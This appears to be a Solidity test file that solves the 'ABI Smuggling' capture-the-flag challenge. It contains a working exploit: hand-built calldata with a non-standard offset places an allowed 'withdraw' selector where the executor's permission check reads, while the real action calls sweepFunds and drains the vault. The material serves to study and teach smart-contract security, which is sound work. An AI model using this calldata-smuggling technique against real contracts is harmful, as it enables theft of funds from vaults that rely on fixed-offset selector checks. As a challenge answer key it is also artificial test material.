...
contract ABISmugglingChallenge is Test {
    ...
    function test_abiSmuggling() public checkSolvedByPlayer {
        // Bug: AuthorizedExecutor.execute hardcodes selector read at calldata
        // offset 100 (= position where actionData's 4-byte selector would be
        // when offset=0x40). By building calldata with offset=0x80, position 100
        // lands on padding we control. Put the allowed `withdraw` selector at
        // position 100, but the real actionData (at the new offset) encodes
        // sweepFunds — which drains the vault.
        bytes memory real = abi.encodeCall(
            SelfAuthorizedVault.sweepFunds, (recovery, IERC20(address(token)))
        );

        bytes memory payload = abi.encodePacked(
            bytes4(0x1cff79cd),                       // execute selector
            bytes32(uint256(uint160(address(vault)))),// target (arg 1)
            bytes32(uint256(0x80)),                    // offset to bytes (arg 2) — non-standard
            bytes32(0),                                // padding slot
            bytes32(bytes4(0xd9caed12)),               // fake selector at position 100
            bytes32(real.length),                      // real actionData length
            real                                       // real actionData
        );

        (bool ok,) = address(vault).call(payload);
        require(ok, "smuggle failed");
    }
